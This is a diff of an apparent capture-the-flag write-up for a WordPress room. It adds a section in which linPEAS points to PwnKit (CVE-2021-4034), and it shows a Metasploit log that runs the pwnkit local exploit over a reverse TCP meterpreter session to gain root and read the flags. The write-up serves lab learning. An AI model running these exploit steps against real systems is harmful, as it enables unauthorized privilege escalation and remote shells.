@@ -6,7 +6,7 @@ Billy Joel made a Wordpress blog!
 From the name and description of the room, we know that we're dealing with a wordpress application. Nevertheless, we scan for all running services on the machine.
 
 ```
-$ sudo nmap -sV -sC <ip_addr> -Pn -n --disable-arp-ping
+$ sudo nmap -sV -sC <machine_ip> -Pn -n --disable-arp-ping
 
 <...snip...>
 PORT    STATE SERVICE     VERSION
@@ -168,6 +168,43 @@ For the user flag, I made use of the hint which is of the format `/*****/***`. T
 
 To Access the content of that folder, we need higher priviliges.
 
-TBC
+Executing the `linPEAS.sh` script hints about many exploitation vector. I tried exploiting some of them unsuccessfully before what did actually work: **pwnkit**
+```
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+```
+
+We send our current session to the background and launch the pwnkit exploit. Now we can access the user flag at `/media/tmp/user.txt` and the root flag at `/root/root.txt`
+```
+meterpreter > bg
+[*] Backgrounding session 1...
+
+msf6 exploit(multi/http/wp_crop_rce) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
+
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set session 1
+session => 1
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set lhost <your_ip>
+lhost => <your_ip>
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run
+
+[*] Started reverse TCP handler on <your_ip>:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] Verify cleanup of /tmp/.pcogeqgxi
+[+] The target is vulnerable.
+[*] Writing '/tmp/.tsqqhfteilu/jcilqimaxeqh/jcilqimaxeqh.so' (548 bytes) ...
+[!] Verify cleanup of /tmp/.tsqqhfteilu
+[*] Sending stage (3045380 bytes) to <machine_ip>
+[+] Deleted /tmp/.tsqqhfteilu/jcilqimaxeqh/jcilqimaxeqh.so
+[+] Deleted /tmp/.tsqqhfteilu/.wlhjnbz
+[+] Deleted /tmp/.tsqqhfteilu
+[*] Meterpreter session 2 opened (<your_ip>:4444 -> <machine_ip>:52260) at 2024-02-26 14:09:43 +0000
+
+meterpreter >
+```
 
 
